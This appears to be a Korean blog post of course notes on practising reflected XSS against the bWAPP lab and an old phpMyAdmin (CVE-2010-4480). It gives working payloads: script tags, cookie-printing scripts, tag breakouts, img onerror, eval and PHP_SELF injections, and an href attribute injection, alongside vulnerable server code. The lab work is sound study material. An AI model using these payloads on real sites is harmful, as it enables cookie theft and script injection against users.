---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - XSS(Reflected)"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part3 A3
  - 크로스 사이트 스크립팅
---

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 15강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

<!--more-->

## XSS - Reflected

* 취약한 매개변수에 악의적인 HTML 코드를 삽입하는 공격
* HTML 태그로 악의적인 사이트에 연결하거나 악성 파일을 다운로드 하도록 유도

![image](https://user-images.githubusercontent.com/28076542/52531115-d0cad500-2d53-11e9-97e5-c40beff2f33d.png)

---

## XSS - Reflected (GET)(Low)

![image](https://user-images.githubusercontent.com/28076542/52531127-0e2f6280-2d54-11e9-98e1-672f2e684ce0.png)

* First name: `<script>alert(1)</script>`, Last name: `<script>document.write(document.cookie)</script>`

![image](https://user-images.githubusercontent.com/28076542/52531668-26a37b00-2d5c-11e9-8094-23db67f9acb8.png)

---

## XSS - Reflected (POST)(Low)

![image](https://user-images.githubusercontent.com/28076542/52531933-56ed1880-2d60-11e9-83c5-36e4ea720ae2.png)

* First name: `<script>alert(1)</script>`, Last name: `<script>document.write(document.cookie)</script>`

### BurpSuite로 값 변경

![image](https://user-images.githubusercontent.com/28076542/52531952-9fa4d180-2d60-11e9-82c6-ad921bdeeb51.png)

* 값을 다음과 같이 변경

![image](https://user-images.githubusercontent.com/28076542/52531977-13df7500-2d61-11e9-9473-8e6863947bb4.png)

![image](https://user-images.githubusercontent.com/28076542/52531984-2ce82600-2d61-11e9-8e8a-69103e378b70.png)

---

## XSS - Reflected (JSON) (Low)

![image](https://user-images.githubusercontent.com/28076542/52531996-56a14d00-2d61-11e9-8801-b774dfddc26b.png)

* test를 입력해주면 다음과 같이 뜸

![image](https://user-images.githubusercontent.com/28076542/52532015-99fbbb80-2d61-11e9-8b0a-0f15a829cff6.png)

### 페이지 소스

```html
<script>

        var JSONResponseString = '{"movies":[{"response":"test??? Sorry, we don&#039;t have that movie :("}]}';

        // var JSONResponse = eval ("(" + JSONResponseString + ")");
        var JSONResponse = JSON.parse(JSONResponseString);

        document.getElementById("result").innerHTML=JSONResponse.movies[0].response;

    </script>
```

* 입력한 값을 자바스크립트로 출력하는 것을 알 수 있음
* 따라서 다음과 같이 스크립트를 닫는 작업으로 무시할 수 있음
* `</script><script>alert(1)</script>`

![image](https://user-images.githubusercontent.com/28076542/52532052-0676ba80-2d62-11e9-9426-04c61957d1be.png)

* 당연히 High에서는 안 됨
* 다음과 같이 소스코드로 방어되어 있음

```php
if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
    {

        // Retrieves the movie title
        $title = $_GET["title"];

    }

    else
    {

        $title = xss_check_3($_GET["title"]);

    }
```

---

## XSS - Reflected (AJAX/JSON)(Low)

![image](https://user-images.githubusercontent.com/28076542/52532088-a03e6780-2d62-11e9-9448-7e0adf735bb5.png)

* `<script>alert(1)</script>`를 입력하면 아무것도 출력이 되지 않음

### 페이지 소스 확인

```javascript
 function process()
        {
            // Proceeds only if the xmlHttp object isn't busy
            if(xmlHttp.readyState == 4 || xmlHttp.readyState == 0)
            {
                // Retrieves the movie title typed by the user on the form
                // title = document.getElementById("title").value;
                title = encodeURIComponent(document.getElementById("title").value);
                // Executes the 'xss_ajax_1-2.php' page from the server
                xmlHttp.open("GET", "xss_ajax_2-2.php?title=" + title, true);  
                // Defines the method to handle server responses
                xmlHttp.onreadystatechange = handleServerResponse;
                // Makes the server request
                xmlHttp.send(null);
            }
            else
                // If the connection is busy, try again after one second  
                setTimeout("process()", 1000);
        }
```

* 내부에서 **xss_ajax_2-2.php**를 호출함을 알 수 있음
* BurpSuite에서 이를 확인할 수 있음

![image](https://user-images.githubusercontent.com/28076542/52532131-3ecac880-2d63-11e9-8a9c-072f2cc219e4.png)

* URL: `http://192.168.190.143/bWAPP/xss_ajax_2-2.php?title=%3Cscript%3Ealert(1)%3C%2Fscript%3E`

![image](https://user-images.githubusercontent.com/28076542/52532170-a84ad700-2d63-11e9-9742-0c1415424c64.png)

* ajax_2-1.php는 문제가 없는데 내부에서 호출한 ajax_2-2.php가 문제가 있는 것

---

## XSS - Reflected (AJAX/JSON)(Medium)

![image](https://user-images.githubusercontent.com/28076542/52532189-ffe94280-2d63-11e9-8d63-45231497ec90.png)

* Low와 같은 URL을 입력해도 alert가 동작하지 않음
* 하지만 이미지 태그를 넣고 onerror로 스크립트를 동작하게 하면 alert가 동작함
* `<img src=x onerror='alert(1)'>`

![image](https://user-images.githubusercontent.com/28076542/52532205-4b035580-2d64-11e9-9770-5a489e37ea53.png)

### XSS - Reflected (AJAX/JSON) 서버 코드

```php
if($_COOKIE["security_level"] == "1")
        {

            // Generates the JSON output
            header("Content-Type: text/json; charset=utf-8");

        }

        // Generates the output depending on the movie title received from the client
        if(in_array(strtoupper($title), $movies))
            echo '{"movies":[{"response":"Yes! We have that movie..."}]}';
        else if(trim($title) == "")
            echo '{"movies":[{"response":"HINT: our master really loves Marvel movies :)"}]}';
         else
            echo '{"movies":[{"response":"' . $title . '??? Sorry, we don\'t have that movie :("}]}';

    }
```

* `security_level == 1`(medium)일 때는 헤더를 정의해줘서 스크립트가 통하지 않았던 것

---

## XSS - Reflected (Eval)(Low)

![image](https://user-images.githubusercontent.com/28076542/52532311-0082d880-2d66-11e9-9026-815ab200e67e.png)

* URL: `http://192.168.190.143/bWAPP/xss_eval.php?date=Date()`에서 `date=Date()`가 취약
* `http://192.168.190.143/bWAPP/xss_eval.php?date=eval(document.write(alert(1)))`을 하면 XSS 동작

![image](https://user-images.githubusercontent.com/28076542/52532322-4b045500-2d66-11e9-9ce0-78b7187b538c.png)

---

## XSS - Reflected (Eval)(High)

![image](https://user-images.githubusercontent.com/28076542/52532330-75eea900-2d66-11e9-99bb-73993dd5cd8b.png)

* URL에 Low와 같은 주소를 입력하면 실행이 안 됨

### XSS - Reflected (Eval) 서버 코드

```php
<?php

    if(isset($_GET["date"]))
    {    

        if($_COOKIE["security_level"] == "2")
        {

            if($_GET["date"] != "Date()")
            { 

                echo "<p><font color=\"red\">Invalid input detected!</font></p>";        

            }

            else
            {

    ?>
```

---

## phpMyAdmin BBCode Tag XSS(Low)

![image](https://user-images.githubusercontent.com/28076542/52532364-468c6c00-2d67-11e9-849a-2aaa97d5612a.png)

![image](https://user-images.githubusercontent.com/28076542/52533178-60cc4700-2d73-11e9-9c9b-c1b265d021df.png)

* [CVE-2010-4480](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4480)
* **BBcode**로 XSS가 실행되듯이 동작하게 할 수 있음

### phpmyadmin

* php 관련 설정을 하는 사이트

![image](https://user-images.githubusercontent.com/28076542/52533217-d506ea80-2d73-11e9-9f82-1b9e8d1dee16.png)

* URL: `http://192.168.190.143/phpmyadmin/`
* php 버전이 낮아 취약점이 존재
* URL: `http://192.168.190.143/phpmyadmin/error.php?type=test1234&error=test4321` 주소에 들어가면 다음과 같은 창이 뜸

![image](https://user-images.githubusercontent.com/28076542/52533248-70985b00-2d74-11e9-8eab-a54324f5fc68.png)

### BBcode 추가

* 이전에 만들어둔 attack.html에 접속하도록 하게 함

### attack.html

```html
<script>alert(document.cookie)</script>
```

* URL: `http://192.168.190.143/phpmyadmin/error.php?type=test1234&error=test4321[a@http://192.168.190.143/bWAPP/attack.html@]click[/a]`

![image](https://user-images.githubusercontent.com/28076542/52533304-41ceb480-2d75-11e9-8090-98f4bd009c15.png)

* 클릭을 하면

![image](https://user-images.githubusercontent.com/28076542/52533308-501cd080-2d75-11e9-9826-097693721758.png)

---

## XSS - Reflected (PHP_SELF)

![image](https://user-images.githubusercontent.com/28076542/52578861-66578900-2e68-11e9-8f6a-b22ad5f3c1de.png)

* `<script>document.write(document.cookie)</script>`를 넣으면 끝

### PHP_SELF

* 세션은 유저마다 변수가 다름
* PHP_SELF는 PHP의 서버 단위에서 전역변수로 사용

```php
<h1>XSS - Reflected (PHP_SELF)</h1>

    <p>Enter your first and last name:</p>

    <form action="<?php echo xss(($_SERVER["PHP_SELF"]));?>" method="GET">

        <p><label for="firstname">First name:</label><br />
        <input type="text" id="firstname" name="firstname"></p>

        <p><label for="lastname">Last name:</label><br />
        <input type="text" id="lastname" name="lastname"></p>

        <button type="submit" name="form" value="submit">Go</button>  

    </form>
```

* form의 action에 **PHP_SELF**가 존재
* 웹페이지의 소스를 보면 다음과 같음

```html
<form action="/bWAPP/xss_php_self.php" method="GET">

        <p><label for="firstname">First name:</label><br />
        <input type="text" id="firstname" name="firstname"></p>

        <p><label for="lastname">Last name:</label><br />
        <input type="text" id="lastname" name="lastname"></p>

        <button type="submit" name="form" value="submit">Go</button>  

    </form>
```

* URL: `192.168.190.143/bWAPP/xss_php_self.php/"/><script>alert(1)</script>`

![image](https://user-images.githubusercontent.com/28076542/52579923-93a53680-2e6a-11e9-87ec-d7bc254cd95f.png)

* PHP_SELF 자체는 취약할 수 있으니 조심

---

## XSS - Reflected (HREF)

![image](https://user-images.githubusercontent.com/28076542/52580181-26de6c00-2e6b-11e9-91da-21a92323080e.png)

* Name을 입력하고 넘어가면 다음과 같은 페이지가 뜸

![image](https://user-images.githubusercontent.com/28076542/52580318-702ebb80-2e6b-11e9-838e-c6267ec92a7d.png)

* 웹페이지 소스를 보면 다음과 같음

```html
<tr height="30">

            <td>G.I. Joe: Retaliation</td>
            <td align="center">2013</td>
            <td>Cobra Commander</td>
            <td align="center">action</td>
            <td align="center"> <a href=xss_href-3.php?movie=1&name=ming&action=vote>Vote</a></td>

        </tr>         

        <tr height="30">

            <td>Iron Man</td>
            <td align="center">2008</td>
            <td>Tony Stark</td>
            <td align="center">action</td>
            <td align="center"> <a href=xss_href-3.php?movie=2&name=ming&action=vote>Vote</a></td>

        </tr>
```

* href에 닉네임이 들어가기 때문에 스크립트를 삽입할 수 있음
* `Ming onmouseover=alert("xss") a`를 삽입하고 Vote에 마우스를 올리면 다음과 같은 결과가 나옴

![image](https://user-images.githubusercontent.com/28076542/52580537-ed5a3080-2e6b-11e9-82c5-f0e416dadca4.png)

* 이렇게 자바스크립트를 띄우는 것에 그치지 말고 이를 활용하는 법도 연구해볼 것